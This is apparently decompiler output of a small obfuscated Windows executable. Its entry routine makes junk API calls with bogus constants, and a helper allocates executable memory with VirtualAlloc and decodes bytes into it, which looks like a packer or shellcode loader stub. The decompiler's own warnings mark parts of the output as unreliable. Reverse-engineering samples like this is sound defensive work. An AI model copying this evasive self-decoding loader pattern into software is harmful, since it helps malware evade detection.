/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// LRESULT __stdcall SendMessageW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// int __stdcall GetDeviceCaps(HDC hdc, int index);
// HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName);
// int __stdcall SetBkMode(HDC hdc, int mode);
// DWORD __stdcall GetCurrentThreadId();
// BOOL __stdcall BitBlt(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
// LRESULT __stdcall SendMessageW_1(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// BOOL __stdcall DeleteDC(HDC hdc);
// BOOL __stdcall BitBlt_1(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
// int __stdcall GetObjectW(HANDLE h, int c, LPVOID pv);
// HBITMAP __stdcall CreateCompatibleBitmap(HDC hdc, int cx, int cy);
// BOOL __stdcall ShowWindow(HWND hWnd, int nCmdShow);
// BOOL __stdcall DeleteObject(HGDIOBJ ho);
// BOOL __stdcall PatBlt(HDC hdc, int x, int y, int w, int h, DWORD rop);
// HANDLE __stdcall GetProcessHeap();
// BOOL __stdcall DeleteObject_1(HGDIOBJ ho);
// BOOL __stdcall TextOutW(HDC hdc, int x, int y, LPCWSTR lpString, int c);
// HICON __stdcall LoadIconW(HINSTANCE hInstance, LPCWSTR lpIconName);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// DWORD __stdcall FormatMessageW(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPWSTR lpBuffer, DWORD nSize, va_list *Arguments);
// BOOL __stdcall GetWindowRect(HWND hWnd, LPRECT lpRect);
// int __stdcall LoadStringW(HINSTANCE hInstance, UINT uID, LPWSTR lpBuffer, int cchBufferMax);
// BOOL __stdcall PostMessageW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL __stdcall PatBlt_1(HDC hdc, int x, int y, int w, int h, DWORD rop);
// BOOL __stdcall UpdateLayeredWindow(HWND hWnd, HDC hdcDst, POINT *pptDst, SIZE *psize, HDC hdcSrc, POINT *pptSrc, COLORREF crKey, BLENDFUNCTION *pblend, DWORD dwFlags);
// HWND __stdcall GetDlgItem(HWND hDlg, int nIDDlgItem);
// UINT_PTR __stdcall SetTimer(HWND hWnd, UINT_PTR nIDEvent, UINT uElapse, TIMERPROC lpTimerFunc);
// HWND __stdcall CreateWindowExW(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// int __usercall start@<eax>(char a1@<ah>, int *a2@<edx>, DWORD a3@<ecx>, int a4@<ebx>, int a5@<edi>, DWORD a6@<esi>);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter_1(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// int __usercall sub_405CEA@<eax>(__int16 a1@<ax>, char a2@<dil>);
// int __stdcall GetSystemMetrics(int nIndex);


//----- (004013C8) --------------------------------------------------------
int __usercall start@<eax>(char a1@<ah>, int *a2@<edx>, DWORD a3@<ecx>, int a4@<ebx>, int a5@<edi>, DWORD a6@<esi>)
{
  DWORD v6; // eax
  DWORD v7; // esi
  int v8; // edx
  int v9; // ecx
  char v10; // dl
  int v11; // ecx
  int v12; // edi
  int j; // eax
  int v14; // ecx
  int v15; // eax
  char v16; // dl
  char v17; // cl
  int v18; // ecx
  char v19; // ch
  int v20; // edx
  HWND v21; // eax
  char v22; // dl
  int v23; // edx
  int v24; // edx
  UINT v25; // esi
  int i; // ebx
  UINT v27; // esi
  HLOCAL v28; // eax
  char v29; // dl
  char v30; // cl
  HANDLE v31; // eax
  char v32; // cl
  char v33; // ch
  char v34; // dh
  char v35; // dl
  void *v36; // edi
  DWORD v37; // eax
  DWORD v38; // ebx
  int v39; // esi
  _BYTE *v40; // edi
  _BOOL2 v41; // ax
  char v42; // dh
  char v43; // ch
  char v44; // cl
  int v45; // ecx
  int v46; // edx
  char v47; // ch
  int result; // eax
  char v49; // dl
  char v50; // dh
  int v51; // ecx
  bool v52; // zf
  int v53; // ecx
  int v54; // ecx
  int v55; // ecx
  int v56; // ecx
  int v57; // ecx
  int v58; // ecx
  int v59; // ecx
  int v60; // ecx
  int v61; // ecx
  int v62; // ecx
  int v63; // ecx
  int v64; // ecx
  int v65; // ecx
  int v66; // ecx
  int v67; // ecx
  int v68; // [esp-64h] [ebp-64h]
  char v69; // [esp-54h] [ebp-54h] BYREF
  int v70; // [esp-48h] [ebp-48h]
  void *v71; // [esp-44h] [ebp-44h]
  DWORD v72; // [esp-40h] [ebp-40h]
  int v73; // [esp-3Ch] [ebp-3Ch]
  int v74; // [esp-38h] [ebp-38h]
  int v75; // [esp-34h] [ebp-34h]
  DWORD v76; // [esp-30h] [ebp-30h]
  DWORD v77; // [esp-2Ch] [ebp-2Ch]
  int v78; // [esp-28h] [ebp-28h]
  int v79; // [esp-24h] [ebp-24h]
  int v80; // [esp-20h] [ebp-20h]
  int v81; // [esp-1Ch] [ebp-1Ch]
  int v82; // [esp-18h] [ebp-18h]
  int v83; // [esp-14h] [ebp-14h]
  DWORD v84; // [esp-10h] [ebp-10h]
  DWORD v85; // [esp-Ch] [ebp-Ch]
  int v86; // [esp-8h] [ebp-8h]
  int v87; // [esp-4h] [ebp-4h]

  BYTE1(a3) = BYTE1(a2) | (unsigned __int8)a2 ^ BYTE1(a3);
  LOBYTE(a3) = BYTE1(a2) + a4;
  v24 = *a2;
  v87 = 213;
  v86 = -606484288;
  v85 = a3;
  v84 = a6;
  v83 = a5;
  v82 = v24;
  v81 = 196;
  v80 = 13622492;
  v79 = 49608;
  v78 = 13617856;
  v77 = a6;
  v76 = a3;
  v75 = 54749;
  v74 = 218;
  v73 = v24;
  v72 = a6;
  v71 = (void *)a3;
  v70 = a4;
  strcpy(&v69, "‘ ⁄”¡∆");
  BYTE1(a3) = a1;
  v25 = a3;
  for ( i = 34196; i != 636769571; BYTE1(a3) -= BYTE1(i) )
    i += 47965;
  v15 = LoadStringW((HINSTANCE)0xDED1, v25, 0, 636769571);
  LOBYTE(v18) = v16 + v17;
  LOBYTE(v20) = BYTE1(v15) ^ (v16 - 85);
  BYTE1(v18) = v19 ^ 0x23 | 0x23;
  v68 = v20;
  PatBlt((HDC)0xA0797D04, 53978, v18, -657991470, 13685707, 0xC6CDu);
  DeleteObject((HGDIOBJ)0xA57B8B63);
  ShowWindow(0, v25);
  SendMessageW((HWND)0xCC965819, 0xDDu, 0xD4C1u, 636769571);
  v21 = (HWND)GetDeviceCaps((HDC)0xFE9CA06F, 636769571);
  LOBYTE(v23) = BYTE1(v23) + v22;
  CreateWindowExW(
    0x25F45523u,
    0,
    0,
    0xC0D3u,
    v23,
    13812422,
    55237,
    203,
    v21,
    (HMENU)0xC6C8DCCF,
    (HINSTANCE)0xC7F47C5D,
    v21);
  TextOutW((HDC)0xF587A2D3, -657080118, 218, 0, v68);
  SetTimer((HWND)0xF65865D6, 0xF3B1A444, 0xC9D7DEC4, (TIMERPROC)0xA28A8AEB);
  GetModuleHandleW(0);
  CreateCompatibleBitmap((HDC)0xE55EF48C, 213, -943536677);
  GetDlgItem((HWND)0x90CAB6AA, 56542);
  LOBYTE(v11) = BYTE1(v11) + v10;
  v12 = v11;
  for ( j = UpdateLayeredWindow(
              (HWND)0xE7399040,
              (HDC)0xD5C2C9,
              (POINT *)0xD8D8,
              (SIZE *)0xD0,
              (HDC)0xCFD7CA,
              (POINT *)0xC1,
              0xC6C6C0u,
              (BLENDFUNCTION *)0xD1DE,
              0xC7D7DCCE); j; --j )
    ;
  LOBYTE(v14) = 85;
  v27 = v14;
  PatBlt_1((HDC)0xBA4D3EAA, 54738, v14, 14539719, v14, 0x5555u);
  SetBkMode((HDC)0xE98D4D76, 13420752);
  GetCurrentThreadId();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0xC5E97A0C);
  v28 = LocalFree((HLOCAL)0xD2536051);
  BYTE1(v28) += v29;
  LOBYTE(v28) = v29 ^ v30;
  BitBlt((HDC)0xBDE02281, (int)v28, v12, 12831198, 14212058, (HDC)0xE4ECD5DB, -706815266, -624108849, 0xC1DDCDC2);
  DeleteObject_1((HGDIOBJ)0xA0B85755);
  v31 = GetProcessHeap();
  SendMessageW_1((HWND)0xD16C7DFC, v27, v27, (LPARAM)v31);
  v36 = v71;
  HIWORD(v6) = HIWORD(v77);
  LOBYTE(v6) = ((v35 - (v33 - v32 - v35)) | v34 | v32) ^ v77;
  BYTE1(v6) = BYTE1(v77) - v6;
  v7 = v6;
  HIWORD(v38) = HIWORD(v85);
  BYTE1(v38) = (_BYTE)v71 + BYTE1(v85);
  LOBYTE(v38) = v85 - (_BYTE)v71;
  v87 = 0;
  while ( LoadLibraryA((LPCSTR)v87) )
    ;
  LOBYTE(v8) = v9 + v8;
  BYTE1(v8) = BYTE1(v9);
  BYTE1(v9) -= v8;
  LOBYTE(v8) = v9 | v8;
  v87 = 51395;
  v86 = v38;
  v85 = v7;
  v84 = v38;
  v83 = -1060911416;
  v82 = v9;
  v81 = (int)v36;
  v80 = v8;
  PostMessageW((HWND)0xABBC1BA6, (unsigned __int8)v9, (WPARAM)v36, -977089829);
  GetObjectW((HANDLE)0x9579AAC4, 49619, v36);
  LoadIconW(0, (LPCWSTR)0x317);
  GetWindowRect((HWND)0xC9CDC767, (LPRECT)0xC6D7);
  v37 = v84;
  BYTE1(v38) = BYTE1(v84) + v80;
  LOBYTE(v38) = v82 ^ v38;
  LOBYTE(v37) = v38 + v84;
  v39 = v87;
  FormatMessageW(v37, (LPCVOID)0xBA63C222, v85, v38, 0, 0xCED6u, (va_list *)0xD1C7);
  v40 = (_BYTE *)v39;
  v41 = DeleteDC((HDC)0xBED2D8D6);
  LOBYTE(v45) = (v42 + v41 - v38) ^ v44;
  BYTE1(v46) = v43 + HIBYTE(v41) + v42;
  BYTE1(v45) = BYTE1(v38) ^ v43;
  BitBlt_1((HDC)0x95E5752E, -742139196, 200, -824980544, 202, (HDC)0x82334A3A, v45, v46, 0xDDu);
  LOBYTE(result) = v39;
  BYTE1(result) = BYTE1(v39) - ((BYTE1(v38) | v47) - BYTE1(v39));
  v50 = (BYTE1(result) | v49) - BYTE1(v38);
LABEL_9:
  LOBYTE(v51) = v39;
LABEL_10:
  BYTE1(v38) |= v51;
LABEL_11:
  LOBYTE(v38) = v50 ^ v38;
LABEL_12:
  LOBYTE(v38) = v50 + v38;
  do
  {
    do
    {
LABEL_13:
      BYTE1(v38) ^= BYTE1(result);
LABEL_14:
      result = sub_405CEA(result, (char)v40);
LABEL_15:
      v54 = v53 - 1;
      if ( !v52 && v54 )
        goto LABEL_9;
LABEL_17:
      v51 = v54 - 1;
      if ( !v52 && v51 )
        goto LABEL_10;
LABEL_19:
      v55 = v51 - 1;
      if ( !v52 && v55 )
        goto LABEL_11;
LABEL_21:
      v56 = v55 - 1;
      if ( !v52 && v56 )
        goto LABEL_12;
LABEL_23:
      v57 = v56 - 1;
      if ( !v52 && v57 )
        goto LABEL_12;
LABEL_25:
      v58 = v57 - 1;
      if ( !v52 && v58 )
        goto LABEL_12;
      v59 = v58 - 1;
      if ( !v52 )
      {
        if ( v59 )
          goto LABEL_12;
      }
      v60 = v59 - 1;
    }
    while ( !v52 && v60 );
LABEL_31:
    v61 = v60 - 1;
  }
  while ( !v52 && v61 );
  do
  {
    v62 = v61 - 1;
    if ( !v52 && v62 )
      goto LABEL_13;
    v63 = v62 - 1;
    if ( !v52 && v63 )
      goto LABEL_14;
    v64 = v63 - 1;
    if ( !v52 && v64 )
      JUMPOUT(0x401649);
    v65 = v64 - 1;
    if ( !v52 && v65 )
      JUMPOUT(0x40164B);
    v66 = v65 - 1;
    if ( !v52 && v66 )
      JUMPOUT(0x40164D);
    v67 = v66 - 1;
    if ( !v52 && v67 )
      JUMPOUT(0x40164F);
    v53 = v67 - 1;
    if ( !v52 && v53 )
      goto LABEL_15;
    v54 = v53 - 1;
    if ( !v52 && v54 )
      goto LABEL_17;
    v51 = v54 - 1;
    if ( !v52 && v51 )
      goto LABEL_19;
    v55 = v51 - 1;
    if ( !v52 && v55 )
      goto LABEL_21;
    v56 = v55 - 1;
    if ( !v52 && v56 )
      goto LABEL_23;
    v57 = v56 - 1;
    if ( !v52 && v57 )
      goto LABEL_25;
    v52 = (_BYTE)result == 0xD0;
    *v40++ = result;
    v60 = v57 - 1;
    if ( (_BYTE)result != 0xD0 && v60 )
      goto LABEL_31;
    v61 = v60 - 1;
  }
  while ( (_BYTE)result != 0xD0 && v61 );
  return result;
}
// 401667: control flows out of bounds to 401649
// 401669: control flows out of bounds to 40164B
// 40166B: control flows out of bounds to 40164D
// 40166D: control flows out of bounds to 40164F
// 4013C8: could not find valid save-restore pair for esi
// 4012D2: variable 'v16' is possibly undefined
// 4012D2: variable 'v17' is possibly undefined
// 4012D4: variable 'v19' is possibly undefined
// 4012E4: variable 'v20' is possibly undefined
// 40130B: variable 'v18' is possibly undefined
// 401361: variable 'v23' is possibly undefined
// 401361: variable 'v22' is possibly undefined
// 401222: variable 'v11' is possibly undefined
// 401222: variable 'v10' is possibly undefined
// 4010C2: variable 'v9' is possibly undefined
// 4010C2: variable 'v8' is possibly undefined
// 4015EB: variable 'v42' is possibly undefined
// 4015EF: variable 'v44' is possibly undefined
// 4015ED: variable 'v43' is possibly undefined
// 40161A: variable 'v45' is possibly undefined
// 40161A: variable 'v46' is possibly undefined
// 401623: variable 'v47' is possibly undefined
// 40162B: variable 'v49' is possibly undefined
// 401474: variable 'v14' is possibly undefined
// 4014D4: variable 'v29' is possibly undefined
// 4014D6: variable 'v30' is possibly undefined
// 401546: variable 'v35' is possibly undefined
// 40152C: variable 'v33' is possibly undefined
// 40152C: variable 'v32' is possibly undefined
// 401536: variable 'v34' is possibly undefined
// 401637: variable 'v50' is possibly undefined
// 401651: variable 'v53' is possibly undefined
// 401651: variable 'v52' is possibly undefined

//----- (00405CEA) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_405CEA@<eax>(__int16 a1@<ax>, char a2@<dil>)
{
  _BYTE *v2; // esi
  unsigned int v3; // eax
  int v5; // ecx
  UINT v6; // ecx
  _BYTE *v7; // [esp+4h] [ebp-4h]

  BYTE2(v6) = 0;
  LOBYTE(v6) = ((unsigned __int8)a1 > 0x3Au) - 102;
  BYTE1(v6) = (58 - a1) | 0xD0;
  v6 &= 0xD5CDC4u;
  LOBYTE(v6) = v6 ^ 0xDD | 0xC0 | HIBYTE(a1) | a2 | v6;
  v6 -= 51920;
  BYTE1(v6) += 59;
  LocalAlloc(v6, 0xD247A826);
  GetSystemMetrics(-674636842);
  SetUnhandledExceptionFilter_1((LPTOP_LEVEL_EXCEPTION_FILTER)0x9E745A83);
  v2 = v7;
  v3 = (unsigned int)VirtualAlloc(0, 0x11A78u, 0x3000u, 0x40u);
  v5 = 16033;
  do
  {
    *(_BYTE *)v3++ = __ROR1__(__ROL1__(*v2++ + 30, 11) + 9, 11);
    --v5;
  }
  while ( v5 );
  LOBYTE(v3) = v3 + 63;
  return v3 | 0xC5D0D8;
}
// 4055A5: positive sp value 4 has been found
// 4055A4: variable 'v7' is possibly undefined

// nfuncs=36 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
